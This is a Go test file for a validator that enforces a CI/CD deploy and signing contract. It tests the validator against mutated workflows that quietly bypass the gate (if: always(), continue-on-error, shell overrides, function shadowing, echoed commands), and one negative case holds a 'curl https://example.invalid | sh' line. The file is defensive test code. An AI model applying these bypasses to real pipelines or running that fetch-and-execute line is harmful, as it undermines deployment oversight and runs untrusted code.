package main

import (
	"bytes"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func repoFile(t *testing.T, rel string) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", rel))
	if err != nil {
		t.Fatalf("read %s: %v", rel, err)
	}
	return string(data)
}

func TestRealDRPublicationSatisfiesTheContract(t *testing.T) {
	t.Parallel()

	if err := validateDRWorkflow(repoFile(t, ".github/workflows/dr-rebuild.yaml")); err != nil {
		t.Fatalf("shipped dr-rebuild.yaml violates the publication contract: %v", err)
	}
	if err := validatePublicationAction(repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")); err != nil {
		t.Fatalf("shipped publication action violates the publication contract: %v", err)
	}
}

func TestRealClusterConfigAllowsTheDRIdentity(t *testing.T) {
	t.Parallel()

	if err := validateVerifyAllowList(repoFile(t, "ksail.prod.yaml")); err != nil {
		t.Fatalf("shipped ksail.prod.yaml violates the allow-list contract: %v", err)
	}
}

func TestRealDirectPushWorkflowIsGatedByTheContract(t *testing.T) {
	t.Parallel()

	if err := validateCDWiring(cdWorkflow(t), deployAction(t)); err != nil {
		t.Fatalf("shipped cd.yaml can deploy to production without the publication contract: %v", err)
	}
}

func cdWorkflow(t *testing.T) string { t.Helper(); return repoFile(t, ".github/workflows/cd.yaml") }
func deployAction(t *testing.T) string {
	t.Helper()
	return repoFile(t, ".github/actions/deploy-prod/action.yml")
}

// TestMisorderedPublicationIsRefusedOnTheDirectPushPath is the end-to-end
// property #2879 asks for: a deliberately mis-ordered publication must be
// refused on the CD route, not merely on the PR route.
//
// 🔴 IT DRIVES run() OVER A REAL TREE, and the earlier version did not — it
// ablated the publisher, checked the ablation separately, then called
// validateCDWiring with the SHIPPED files. The misordered string never reached
// the thing under test, so the second half merely repeated
// TestRealDirectPushWorkflowIsGatedByTheContract and the test as a whole proved
// only that two independent facts each held. That is the vacuous shape this
// file exists to catch, and it survived here for a round.
func TestMisorderedPublicationIsRefusedOnTheDirectPushPath(t *testing.T) {
	t.Parallel()

	// Baseline: the faithful copy must PASS, or the refusal below could be
	// caused by the copying rather than by the ablation.
	clean := repoTreeCopy(t, nil)
	var stdout, stderr bytes.Buffer
	if code := run(
		filepath.Join(clean, ".github/workflows/dr-rebuild.yaml"),
		filepath.Join(clean, "ksail.prod.yaml"),
		&stdout, &stderr,
	); code != 0 {
		t.Fatalf("faithful copy of the shipped tree must pass, got %d: %s", code, stderr.String())
	}

	// Push straight to the promoted reference instead of the staging one — the
	// exact ordering defect #2627 tracks — and drive the whole CLI over it.
	misordered := repoTreeCopy(t, map[string]func(string) string{
		".github/actions/deploy-prod/publish-platform-manifests/action.yml": func(body string) string {
			return strings.Replace(body, `workload push "${STAGING_OCI_REF}"`, `workload push "${PROMOTED_OCI_REF}"`, 1)
		},
	})
	stdout.Reset()
	stderr.Reset()
	code := run(
		filepath.Join(misordered, ".github/workflows/dr-rebuild.yaml"),
		filepath.Join(misordered, "ksail.prod.yaml"),
		&stdout, &stderr,
	)
	if code == 0 {
		t.Fatal("a mis-ordered publication was accepted on the direct-push path")
	}
	if !strings.Contains(stderr.String(), "staging") {
		t.Fatalf("refusal does not name the ordering defect: %q", stderr.String())
	}
}

// repoTreeCopy materialises the files the CLI reads into a temp tree, applying
// an optional per-path mutation. Copying rather than mutating in place is what
// lets the test drive the real entry point without touching the repository.
func repoTreeCopy(t *testing.T, mutate map[string]func(string) string) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{
		".github/workflows/dr-rebuild.yaml",
		".github/workflows/cd.yaml",
		".github/workflows/ci.yaml",
		".github/actions/deploy-prod/action.yml",
		".github/actions/deploy-prod/publish-platform-manifests/action.yml",
		"ksail.prod.yaml",
	} {
		body := repoFile(t, rel)
		if mutate != nil {
			if apply, ok := mutate[rel]; ok {
				mutated := apply(body)
				if mutated == body {
					t.Fatalf("%s: mutation changed nothing; re-aim it rather than trusting the result", rel)
				}
				body = mutated
			}
		}
		dest := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(dest), 0o750); err != nil {
			t.Fatalf("mkdir %s: %v", dest, err)
		}
		if err := os.WriteFile(dest, []byte(body), 0o600); err != nil {
			t.Fatalf("write %s: %v", dest, err)
		}
	}
	return root
}

func TestCDWiringRejectsEachAblation(t *testing.T) {
	t.Parallel()

	cd := cdWorkflow(t)
	action := deployAction(t)
	if err := validateCDWiring(cd, action); err != nil {
		t.Fatalf("precondition: the shipped workflow must PASS before ablating it: %v", err)
	}

	// Each ablation removes exactly one link in the chain that makes the gate
	// real, and each must be refused. The last four were raised by Codex against
	// the text-scanning version of this check, and every one of them left a
	// workflow that READ as gated — which is what makes them worth pinning
	// rather than fixing quietly.
	for name, ablate := range map[string]func(string, string) (string, string){
		"unwired": func(w, a string) (string, string) {
			return strings.Replace(w, ", validate-publication-contract]", "]", 1), a
		},
		"gate job removed": func(w, a string) (string, string) {
			return strings.Replace(w, "  validate-publication-contract:", "  unrelated-job:", 1), a
		},
		"gate no longer runs the validator": func(w, a string) (string, string) {
			return strings.Replace(w, "go run ./scripts/validate-dr-signing", "echo skipped", 1), a
		},
		"deploy no longer uses the shared action": func(w, a string) (string, string) {
			return strings.Replace(w, "uses: ./.github/actions/deploy-prod\n", "uses: ./.github/actions/other\n", 1), a
		},
		"deploy uses a SIBLING action with the same prefix": func(w, a string) (string, string) {
			return strings.Replace(w, "uses: ./.github/actions/deploy-prod\n", "uses: ./.github/actions/deploy-prod-canary\n", 1), a
		},
		"deploy uses a NESTED action under the same path": func(w, a string) (string, string) {
			return strings.Replace(
				w, "uses: ./.github/actions/deploy-prod\n",
				"uses: ./.github/actions/deploy-prod/publish-platform-manifests\n", 1,
			), a
		},
		// Codex P2: the gate ECHOES the command instead of running it. Exits 0,
		// validates nothing, and a substring scan of the run block accepts it.
		"gate ECHOES the validator instead of running it": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml",
				`          echo "go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml"`,
				1,
			), a
		},
		// Codex P2: the dependency is deleted, but text that LOOKS like it
		// survives elsewhere in the job. A line scan reports a dependency
		// GitHub does not have.
		"needs deleted while a heredoc still contains the text": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"    needs: [validate-eks-authorization, validate-publication-contract]",
				"    needs: [validate-eks-authorization]\n    env:\n      NOTE: \"needs: [validate-publication-contract]\"",
				1,
			), a
		},
		// Codex P2, and the most dangerous of the set: `needs` is intact and
		// `if: always()` schedules the deploy after the gate FAILS. Membership
		// alone cannot see it, and the workflow reads entirely correct.
		"deploy carries a job-level condition that survives a failed gate": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"    needs: [validate-eks-authorization, validate-publication-contract]",
				"    needs: [validate-eks-authorization, validate-publication-contract]\n    if: always()",
				1,
			), a
		},
		// Codex P2, round 2: the SAME class as the job-level condition below,
		// one level down. The step carries the right command and never runs it,
		// or runs it and suppresses the failure — either way the workflow reads
		// as gated and `needs` is satisfied.
		"validator step is skipped by a step condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        if: false\n",
				1,
			), a
		},
		"validator step suppresses its own failure": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        continue-on-error: true\n",
				1,
			), a
		},
		"gate JOB is skipped by a job condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    if: false\n",
				1,
			), a
		},
		"gate JOB suppresses its own failure": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    continue-on-error: true\n",
				1,
			), a
		},
		// CodeRabbit P1 and Codex P2, round 9, reported INDEPENDENTLY against
		// this same head — the SIXTH shape of "the line is present but does it
		// run", and the one that finally says the denylist was the wrong
		// mechanism. `go()` `{` `}` carry no rejected keyword and no rejected
		// operator, so the block is accepted; bash resolves the FUNCTION before
		// the executable, so both required lines run and neither validator does.
		"gate SHADOWS go with a shell function so neither validator executes": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          go()\n          {\n            true\n          }\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// The same bypass in its non-invoking spelling: the required lines are
		// hidden INSIDE a function body that is never called, and a succeeding
		// command follows. Kept as a separate arm because it defeats a fix that
		// only refuses a function whose name collides with a required command.
		"gate BURIES both validators in an uninvoked function body": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          validator_noop()\n          {\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 3: the THIRD shape of "the line is present but does it
		// run". Whole-line equality closed the quoted case, step metadata closed
		// the skipped case, and neither says the SHELL reaches it.
		"validator command sits after an early exit": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          exit 0\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		"validator command is wrapped in a false conditional": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          if false; then\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 3: the composite action was still SCANNED while
		// cd.yaml was parsed — a heredoc in a run block carries the exact
		// `uses:` text while the action invokes nothing of the sort.
		"publisher uses: text survives only inside a heredoc": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      run: |\n        cat <<'EOF'\n        uses: ./.github/actions/deploy-prod/publish-platform-manifests\n        EOF",
				1,
			)
		},
		// Codex P2, round 4: a here-doc contains the validator line verbatim
		// while the step only PRINTS it. Redirection joins the operator set.
		"validator command is inside a here-doc": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          cat <<'EOF'\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 4: the DEPLOY step — the same skip/suppression
		// question already asked of the validator step, at the cell I had not
		// swept. A skipped deploy step still names the shared action.
		"deploy step is skipped by a step condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🚀 Deploy to Production\n        # The deploy logic",
				"      - name: 🚀 Deploy to Production\n        if: false\n        # The deploy logic",
				1,
			), a
		},
		// Codex P2, round 5: the FOURTH matched step whose metadata I discarded —
		// the nested publisher itself. Skipping it lets the shared action pass
		// straight over the stage/sign/attest/promote transaction and carry on
		// into reconciliation. requireEnforcedStep now makes this cell, and any
		// future one, unrepresentable.
		"nested publisher step is skipped": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      if: false\n      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				1,
			)
		},
		"nested publisher step suppresses failure": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      continue-on-error: true\n      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				1,
			)
		},
		// CodeRabbit P1: `set +e` runs the validator and DISCARDS its verdict,
		// then a later succeeding line carries the step to exit 0. The fifth
		// shape of "does this command count" — quoted, skipped, unreached,
		// printed, and now ignored.
		"validator failure is discarded by set +e": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          set +e\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// ...and the same question one key over.
		"validator step overrides the shell": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        shell: bash {0}\n",
				1,
			), a
		},
		// CodeRabbit P1: the same key one SCOPE out. Refusing `steps[*].shell`
		// leaves `defaults.run.shell` untouched at both job and workflow scope,
		// and GitHub applies those to the very step this gate depends on. A
		// custom template such as `bash {0}` takes full control of the shell
		// options, so the default `-e` is gone and the trailing `true` carries
		// a FAILED validator to exit 0. Both scopes get their own arm: they are
		// separate keys in separate maps, and a fix that reads one and not the
		// other passes whichever arm it happens to cover.
		"job-level defaults.run.shell discards the validator verdict": func(w, a string) (string, string) {
			w = strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash {0}\n",
				1,
			)
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n",
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n          true\n",
				1,
			), a
		},
		"workflow-level defaults.run.shell discards the validator verdict": func(w, a string) (string, string) {
			w = strings.Replace(
				w,
				"\njobs:\n",
				"\ndefaults:\n  run:\n    shell: bash {0}\n\njobs:\n",
				1,
			)
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n",
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n          true\n",
				1,
			), a
		},
		// Codex P2: the contract is checked against the nested publisher, so it
		// only means anything while the shared action still calls it. Otherwise
		// the validator verifies an unused file and reports success.
		"shared action no longer invokes the checked publisher": func(w, a string) (string, string) {
			return w, strings.Replace(
				a, "uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"uses: ./.github/actions/deploy-prod/some-other-publisher", 1,
			)
		},
	} {
		t.Run(name, func(t *testing.T) {
			ablatedCD, ablatedAction := ablate(cd, action)
			if ablatedCD == cd && ablatedAction == action {
				t.Fatalf("ablation changed nothing; re-aim it rather than trusting the result")
			}
			if err := validateCDWiring(ablatedCD, ablatedAction); err == nil {
				t.Fatal("ablation was accepted, so the check does not constrain it")
			}
		})
	}
}

func TestMergeQueueProductionRoutesUseTheCheckedAction(t *testing.T) {
	t.Parallel()

	ci := repoFile(t, ".github/workflows/ci.yaml")
	if err := validateProductionRoutes(ci); err != nil {
		t.Fatalf("shipped ci.yaml can reach production outside the checked action: %v", err)
	}

	// 🔴 The premise of this contract is that the guarantee is only as strong as
	// its weakest ROUTE, and until this round it checked one of the two. Codex
	// reproduced the gap: replacing only the merge-queue job's shared-action
	// call passed every check here while the direct-push route stayed gated.
	for name, ablate := range map[string]func(string) string{
		"merge-queue deploy uses a different action": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        uses: ./.github/actions/other\n", 1)
		},
		"merge-queue heal uses a different action": func(s string) string {
			// The SECOND occurrence is the healing job; replace it by cutting at
			// the first and rejoining, so the arm cannot silently hit the wrong one.
			first := strings.Index(s, "        uses: ./.github/actions/deploy-prod\n")
			if first < 0 {
				// Return the input unchanged rather than calling t.Fatal on the OUTER T from
				// inside the subtest closure: that runs runtime.Goexit on the subtest goroutine
				// while marking the parent failed, and `testing` then reports a confusing
				// "test executed panic(nil) or runtime.Goexit" instead of the real reason. The
				// caller already refuses an ablation that changed nothing, against the subtest.
				return s
			}
			cut := first + len("        uses: ./.github/actions/deploy-prod\n")
			return s[:cut] + strings.Replace(s[cut:], "        uses: ./.github/actions/deploy-prod\n", "        uses: ./.github/actions/other\n", 1)
		},
		"merge-queue deploy step is skipped": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        if: false\n        uses: ./.github/actions/deploy-prod\n", 1)
		},
		"merge-queue deploy step suppresses failure": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        continue-on-error: true\n        uses: ./.github/actions/deploy-prod\n", 1)
		},
		// Codex P2, round 9. The direct-push route refuses ANY job-level
		// condition on deploy-prod; this route deliberately permits one, because
		// `merge_group` gating is legitimate — and that carve-out was total.
		// `always()` makes the deploy eligible after `changes` FAILS, and the
		// signing validator runs inside `changes`, so the publishing job runs
		// behind a gate that already failed while this check reports success.
		"merge-queue deploy overrides a failed dependency with always()": func(s string) string {
			return strings.Replace(
				s,
				"    if: github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
				"    if: always() && github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
				1,
			)
		},
	} {
		t.Run(name, func(t *testing.T) {
			ablated := ablate(ci)
			if ablated == ci {
				t.Fatal("ablation changed nothing; re-aim it rather than trusting the result")
			}
			if err := validateProductionRoutes(ablated); err == nil {
				t.Fatal("ablation was accepted, so the check does not constrain it")
			}
		})
	}

	// The job-level condition rule must NOT apply here: ci.yaml gates its deploy
	// on `merge_group`, which is legitimate and necessary. Asserting the shipped
	// file passes (above) is what pins that — but state it, or a later round may
	// "tighten" this into rejecting the real workflow.
}

// TestDependencyStatusOverrideRefusalSeparatesFunctionsFromComparisons pins the
// distinction the refusal rests on. Refusing every mention of "failure" would
// also refuse `needs.x.result == 'failure'`, which overrides nothing — and the
// heal job's own real condition contains exactly that, so getting this wrong
// breaks the shipped workflow rather than some hypothetical one.
func TestDependencyStatusOverrideRefusalSeparatesFunctionsFromComparisons(t *testing.T) {
	t.Parallel()

	gated := mergeQueueProductionJob{name: "deploy-prod"}
	exempt := mergeQueueProductionJob{name: "heal-prod-on-failure", mayOverrideDependencyStatus: true}

	allowed := map[string]any{
		"no condition at all":     nil,
		"a plain event gate":      "github.event_name == 'merge_group'",
		"a result COMPARISON":     "needs.deploy-prod.result == 'failure'",
		"a success() assertion":   "success() && github.event_name == 'merge_group'",
		"an unrelated identifier": "needs.changes.outputs.always == 'true'",
	}
	for name, condition := range allowed {
		job := map[string]any{}
		if condition != nil {
			job["if"] = condition
		}
		if err := refuseDependencyStatusOverride(job, gated); err != nil {
			t.Fatalf("%s must be accepted, or the guard refuses correct work: %v", name, err)
		}
	}

	refused := map[string]string{
		"always":              "always() && github.event_name == 'merge_group'",
		"failure":             "failure() && needs.changes.outputs.k8s == 'true'",
		"cancelled":           "!cancelled()",
		"wrapped in ${{ }}":   "${{ always() }}",
		"spelled with spaces": "always ()",
		"upper-cased":         "ALWAYS()",
	}
	for name, condition := range refused {
		if err := refuseDependencyStatusOverride(map[string]any{"if": condition}, gated); err == nil {
			t.Fatalf("%s must be refused on a job that publishes on the success path", name)
		}
		// ...and the exemption must still let the heal job through, or the
		// carve-out is not actually doing anything.
		if err := refuseDependencyStatusOverride(map[string]any{"if": condition}, exempt); err != nil {
			t.Fatalf("%s must remain allowed on the unsuccessful-path heal job: %v", name, err)
		}
	}
}

func TestParsedHelpersFailClosedOnShapesTheyCannotRead(t *testing.T) {
	t.Parallel()

	// The failure direction that matters for all three: a shape the helper
	// cannot read must report absence, never presence. An unrecognised workflow
	// style reading as "gated" is the one outcome that lets a deploy through.
	if stringListContains(map[string]any{"a": true}, "a") {
		t.Fatal("a mapping must not satisfy a sequence membership test")
	}
	if stringListContains(nil, "a") {
		t.Fatal("an absent value must not satisfy a membership test")
	}
	if !stringListContains([]any{"x", "validate-publication-contract"}, "validate-publication-contract") {
		t.Fatal("a real sequence entry must satisfy it")
	}
	if !stringListContains("validate-publication-contract", "validate-publication-contract") {
		t.Fatal("the lone-scalar needs form must satisfy it")
	}

	// runsCommand: the command quoted inside another command is not run.
	if runsCommand("go run ./x")(map[string]any{"run": "echo \"go run ./x\"\n"}) {
		t.Fatal("an echoed command must not count as executed")
	}
	if !runsCommand("go run ./x")(map[string]any{"run": "go test ./x\ngo run ./x\n"}) {
		t.Fatal("a command on its own run line must count as executed")
	}

	// enforcesFailure: both suppression shapes are refused, and the plain node
	// is accepted — the second half matters, or the check could be refusing
	// everything and still look correct.
	if enforcesFailure(map[string]any{"if": "false"}, "x") == nil {
		t.Fatal("a condition must be refused")
	}
	if enforcesFailure(map[string]any{"continue-on-error": true}, "x") == nil {
		t.Fatal("continue-on-error: true must be refused")
	}
	if err := enforcesFailure(map[string]any{"continue-on-error": false}, "x"); err != nil {
		t.Fatalf("an explicit continue-on-error: false is not suppression: %v", err)
	}
	if err := enforcesFailure(map[string]any{"run": "go test ./x"}, "x"); err != nil {
		t.Fatalf("a plain node must be accepted: %v", err)
	}

	// usesAction: equality, so a prefix-sharing sibling is a different action.
	if usesAction("./a/b")(map[string]any{"uses": "./a/b-canary"}) {
		t.Fatal("a sibling path sharing a prefix must not satisfy an action check")
	}
	if usesAction("./a/b")(map[string]any{"uses": "./a/b/c"}) {
		t.Fatal("a nested path must not satisfy an action check")
	}
	// POSITIVE case — without it a usesAction that always returned false
	// would pass both assertions above. Same argument as the enforcesFailure
	// positive case; it applies here too and I had not applied it.
	if !usesAction("./a/b")(map[string]any{"uses": "./a/b"}) {
		t.Fatal("the exact action path must satisfy an action check")
	}

	// 🔴 requireEnforcedStep is where matching and enforcing became ONE
	// operation, after four review rounds each found a different matched step
	// whose metadata had been discarded. These assert that they cannot be
	// separated again: a matching-but-skipped step is an ERROR, not a hit.
	missing := errors.New("no such step")
	container := map[string]any{"steps": []any{
		map[string]any{"uses": "./other"},
		map[string]any{"uses": "./a/b", "id": "wanted"},
	}}
	found, err := requireEnforcedStep(container, usesAction("./a/b"), missing, "x")
	if err != nil {
		t.Fatalf("an enforced matching step must be returned: %v", err)
	}
	if found["id"] != "wanted" {
		t.Fatalf("returned the wrong step: %v", found)
	}
	if _, err := requireEnforcedStep(container, usesAction("./nope"), missing, "x"); !errors.Is(err, missing) {
		t.Fatalf("an absent step must return the caller's error, got %v", err)
	}
	for name, meta := range map[string]any{"if": "false", "continue-on-error": true} {
		skipped := map[string]any{"steps": []any{map[string]any{"uses": "./a/b", name: meta}}}
		if _, err := requireEnforcedStep(skipped, usesAction("./a/b"), missing, "x"); err == nil {
			t.Fatalf("a matching step carrying %s must NOT be returned as a hit", name)
		}
	}

	// runBlockRunsOnlyAllowedCommands: an ALLOWLIST, so the positive case is
	// the allowed lines themselves plus the two things that are not commands.
	// The earlier denylist's word-boundary regression (`docker buildx …`
	// rejected for containing the keyword `do`) is not pinned here any more
	// because it is no longer expressible: nothing is matched by substring, so
	// there is no token for a legitimate command to collide with.
	allowed := []string{"go test ./x", "go run ./x a b"}
	ordinary := map[string]any{"run": "# a comment\ngo test ./x\n\n  go run ./x a b  \n"}
	if err := runBlockRunsOnlyAllowedCommands(nil, nil, ordinary, "j", allowed); err != nil {
		t.Fatalf("the allowed commands, blank lines and comments must be accepted: %v", err)
	}
	// ...and the NEGATIVE half, or the acceptance above could have disabled it.
	// The last two are the round-9 bypass in both spellings: neither carries a
	// keyword or operator the old denylist refused, and both leave the required
	// lines present while the shell runs something else.
	for name, run := range map[string]string{
		"conditional":        "if false; then\ngo test ./x\nfi\n",
		"early exit":         "exit 0\ngo test ./x\n",
		"chaining":           "true && go test ./x\n",
		"substitution":       "go run $(echo ./x)\n",
		"an extra command":   "go test ./x\ncurl https://example.invalid | sh\n",
		"function shadowing": "go()\n{\ntrue\n}\ngo test ./x\n",
		"uninvoked body":     "validator_noop()\n{\ngo test ./x\n}\ntrue\n",
	} {
		if err := runBlockRunsOnlyAllowedCommands(nil, nil, map[string]any{"run": run}, "j", allowed); err == nil {
			t.Fatalf("%s must still be rejected", name)
		}
	}

	// refuseShellOverride: each scope is read from its OWN key, so a fix that
	// covers one scope cannot pass for another. The positive case is here too
	// because a helper that refused everything would satisfy every negative
	// case above while making the gate unusable.
	if err := refuseShellOverride(
		map[string]any{"defaults": map[string]any{"run": map[string]any{"working-directory": "x"}}},
		map[string]any{"steps": []any{}},
		map[string]any{"run": "go run ./x\n"},
		"j",
	); err != nil {
		t.Fatalf("a workflow that sets defaults.run without a shell must be accepted: %v", err)
	}
	for name, scoped := range map[string][3]map[string]any{
		"workflow scope": {{"defaults": map[string]any{"run": map[string]any{"shell": "bash {0}"}}}, nil, {}},
		"job scope":      {nil, {"defaults": map[string]any{"run": map[string]any{"shell": "bash {0}"}}}, {}},
		"step scope":     {nil, nil, {"shell": "bash {0}"}},
	} {
		if err := refuseShellOverride(scoped[0], scoped[1], scoped[2], "j"); err == nil {
			t.Fatalf("a shell override at %s must be refused", name)
		}
	}
}

func TestDRWorkflowContractRejectsEachAblation(t *testing.T) {
	t.Parallel()

	workflow := repoFile(t, ".github/workflows/dr-rebuild.yaml")
	cases := []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name:    "without id-token the job cannot mint a Fulcio certificate",
			old:     "      id-token: write # keyless cosign signing (Fulcio OIDC)\n",
			wantErr: "id-token: write",
		},
		{
			name:    "without packages permission the transaction cannot publish",
			old:     "      packages: write # push OCI artifacts to GHCR\n",
			wantErr: "packages: write",
		},
		{
			name:    "without attestations permission evidence cannot be written",
			old:     "      attestations: write # write SBOM + SLSA provenance attestations\n",
			wantErr: "attestations: write",
		},
		{
			name:    "without the shared action DR can drift from normal deploy",
			old:     "uses: ./.github/actions/deploy-prod/publish-platform-manifests",
			new:     "uses: ./.github/actions/other-publisher",
			wantErr: "shared publication action",
		},
		{
			name:    "a renamed rebuild job hides the whole contract",
			old:     "\n  rebuild:\n",
			new:     "\n  rebuild-renamed:\n",
			wantErr: "missing rebuild job",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.ReplaceAll(workflow, testCase.old, testCase.new)
			if ablated == workflow {
				t.Fatalf("ablation changed nothing — the control does not target a real line")
			}
			err := validateDRWorkflow(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}

func TestPublicationActionRejectsEachAblation(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	cases := []struct {
		name    string
		old     string
		new     string
		wantErr string
	}{
		{
			name:    "without a unique staging tag concurrent runs share mutable bytes",
			old:     `STAGING_TAG="staging-${GITHUB_SHA}-${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"`,
			new:     `STAGING_TAG="latest"`,
			wantErr: "unique staging reference",
		},
		{
			name:    "without a staging push there is nothing immutable to evidence",
			old:     `workload push "${STAGING_OCI_REF}"`,
			new:     `echo skip-push`,
			wantErr: "staging reference",
		},
		{
			name:    "without the environment bridge an expression reaches shell code",
			old:     "STAGING_OCI_REF: ${{ steps.staging_reference.outputs.oci_ref }}\n",
			wantErr: "environment bridge",
		},
		{
			name:    "without signing the promoted bytes are unverifiable",
			old:     `cosign sign --yes --recursive "ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}"`,
			new:     `echo skip-signing`,
			wantErr: "without signing",
		},
		{
			name:    "signing latest reintroduces a mutable-tag race",
			old:     `ghcr.io/devantler-tech/platform/manifests@${STAGING_DIGEST}`,
			new:     `ghcr.io/devantler-tech/platform/manifests:latest`,
			wantErr: "resolved staging digest",
		},
		{
			name:    "without an SBOM attestation latest lacks required evidence",
			old:     "uses: actions/attest@",
			new:     "uses: actions/skip-attest@",
			wantErr: "SBOM attestation",
		},
		{
			name:    "without provenance latest lacks required evidence",
			old:     "uses: actions/attest-build-provenance@",
			new:     "uses: actions/skip-provenance@",
			wantErr: "provenance attestation",
		},
		{
			name:    "without digest-preserving promotion latest can name new bytes",
			old:     "docker buildx imagetools create --prefer-index=false",
			new:     "docker buildx imagetools create",
			wantErr: "digest-preserving",
		},
		{
			name:    "without post-promotion equality latest may name other bytes",
			old:     `if [[ "${LATEST_DIGEST}" != "${STAGING_DIGEST}" ]]; then`,
			new:     `if false; then`,
			wantErr: "verify latest",
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()
			ablated := strings.ReplaceAll(publisher, testCase.old, testCase.new)
			if ablated == publisher {
				t.Fatalf("ablation changed nothing — the control does not target a real line")
			}
			err := validatePublicationAction(ablated)
			if err == nil || !strings.Contains(err.Error(), testCase.wantErr) {
				t.Fatalf("wrong result: got %v, want error mentioning %q", err, testCase.wantErr)
			}
		})
	}
}

func TestPublicationActionRejectsPromotionBeforeEvidence(t *testing.T) {
	t.Parallel()

	publisher := repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")
	const provenance = "      uses: actions/attest-build-provenance@"
	const promotion = "        docker buildx imagetools create --prefer-index=false"
	publisher = strings.ReplaceAll(publisher, provenance, "      uses: actions/temporary-placeholder@")
	publisher = strings.ReplaceAll(publisher, promotion, "        uses: actions/attest-build-provenance@")
	publisher = strings.ReplaceAll(publisher, "      uses: actions/temporary-placeholder@", "      run: docker buildx imagetools create --prefer-index=false")

	err := validatePublicationAction(publisher)
	if err == nil || !strings.Contains(err.Error(), "before promotion") {
		t.Fatalf("promotion before provenance was accepted: %v", err)
	}
}

func TestVerifyAllowListRejectsAMissingDRIdentity(t *testing.T) {
	t.Parallel()

	config := repoFile(t, "ksail.prod.yaml")
	ablated := strings.ReplaceAll(config, drIdentitySubject, `^https://example\.invalid$`)
	if ablated == config {
		t.Fatal("ablation changed nothing — the DR identity is not present to remove")
	}
	if err := validateVerifyAllowList(ablated); err == nil {
		t.Fatal("allow-list without the DR identity was accepted")
	}
}

func TestRunReportsSuccessAndFailure(t *testing.T) {
	t.Parallel()

